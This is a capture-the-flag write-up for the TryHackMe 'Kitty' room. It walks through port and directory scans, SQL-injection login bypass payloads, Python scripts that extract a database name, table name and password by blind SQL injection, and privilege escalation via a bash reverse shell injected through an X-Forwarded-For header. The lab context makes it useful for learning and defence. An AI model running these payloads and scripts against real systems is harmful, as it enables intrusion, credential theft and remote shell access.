# Kitty

**Room Link:** [https://tryhackme.com/r/room/kitty](https://tryhackme.com/r/room/kitty)

#### **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **TCP/80 - HTTP**

#### Find Pages <a href="#find-pages" id="find-pages"></a>

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (967).png" alt=""><figcaption></figcaption></figure>

**Payload**

```
or 1=1
or 1=1--
or 1=1#
or 1=1/*
kitty' --
kitty' -- - 
kitty' #
kitty'/*
kitty' or '1'='1
kitty' or '1'='1'--
kitty' or '1'='1'#
kitty' or '1'='1'/*
kitty'or 1=1 or ''='
```

A few of the options above work but I choose this one, I can login but there's nothing developed

**Payload**

```
Username: kitty' -- - 
Password: kitty' -- - 
```

<figure><img src="../../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>



## Retrieving database name from boolean sqli <a href="#ee3c" id="ee3c"></a>

So, the plan is to know the name of the database. However, manual attempts will be terribly time-consuming, so I decided to practice scripting. After some time spent trying different payloads, this one worked:

**Statement**

```
' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY 'a%' -- -
```



Was able to get the database name using this script

**Kali**

```
git clone https://github.com/Sonat55/Boolean-Based-SQLI-attacks-helper---for-CTF.git
cd Boolean-Based-SQLI-attacks-helper---for-CTF/
```

**script.py**

```
import sys
import requests

def sqli(ip):
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
    tmp = ""

    while True:
        for i in symbols:
            post= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
            status_code=req.status_code
            print(f"{i}", end='\r')
            if status_code == 302:
                tmp += i
                print(tmp)
                break
            elif i == " " :
                print("\n[#] Attack compleated B)")
                print(f"DB_NAME: {tmp}")
                exit()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <ip>" % sys.argv[0])
        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving database..")
    sqli(url)

if __name__ == "__main__":
    main()

```

**Kali**

```
python script.py $VICTIM
```

<figure><img src="../../.gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>

## Table enumeration <a href="#e78c" id="e78c"></a>

**Statement**

```
' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY 'a%' -- -
```

**script.py**

```
import sys
import requests

def sqli(ip):
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
    tmp = ""

    while True:
        for i in symbols:
            post= {"username":f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
            status_code=req.status_code
            print(f"{i}", end='\r')
            if status_code == 302:
                tmp += i
                print(tmp)
                break
            elif i == " " :
                print("\n[#] Attack complete:")
                print(f"TABLE_NAME: {tmp}")
                exit()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <ip>" % sys.argv[0])
        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving database..")
    sqli(url)

if __name__ == "__main__":
    main()

```

**Kali**

```
python script.py $VICTIM
```

<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>

## Password enumeration <a href="#adc0" id="adc0"></a>

We already know the username “kitty,” so let’s go straight to the password.

**Statement**

```
' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY 'a%';-- -
```

**script.py**

```
import sys
import requests

def sqli(ip):
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
    tmp = ""

    while True:
        for i in symbols:
            post= {"username":f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
            status_code=req.status_code
            print(f"{i}", end='\r')
            if status_code == 302:
                tmp += i
                print(tmp)
                break
            elif i == " " :
                print("\n[#] Attack complete:")
                print(f"Password:: {tmp}")
                exit()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <ip>" % sys.argv[0])
        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving database..")
    sqli(url)

if __name__ == "__main__":
    main()

```

**Kali**

```
python script.py $VICTIM
```

<figure><img src="../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>

## **TCP/22 - SSH**

**Kali**

```
ssh kitty@$VICTIM
Password: L0ng_Liv3_KittY
```

<figure><img src="../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ss -ltp
```

<figure><img src="../../.gitbook/assets/image (972).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
subl /etc/proxychains.conf
```

**proxychains.conf**

```
socks4 	127.0.0.1 9050
```

**Kali**

```
ssh -L 8081:127.0.0.1:8080 kitty@$VICTIM
Password: L0ng_Liv3_KittY
```

<figure><img src="../../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>

## Privlege Escalation <a href="#adc0" id="adc0"></a>

We already know the username “kitty,” so let’s go straight to the password.

**Kali**

```
nc -nvlp
```

**Victim**

```
echo 'sh -i >& /dev/tcp/$KALI/1337 0>&1' > /tmp/revshell.sh
chmod +x /tmp/revshell.sh
```

### **Option #1**

**Kali**

```
curl 'http://127.0.0.1:8081/index.php' -d "username=hacker' OR '1'='1-- -&password=epic" -H 'X-Forwarded-For: $(bash /tmp/revshell.sh)'
```

<figure><img src="../../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

### **Option #2**

<figure><img src="../../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>

**X-Forwarded-For**

Add the following line to the payload

```
X-Forwarded-For: $(bash /tmp/revshell.sh)
```

<figure><img src="../../.gitbook/assets/image (977).png" alt=""><figcaption></figcaption></figure>



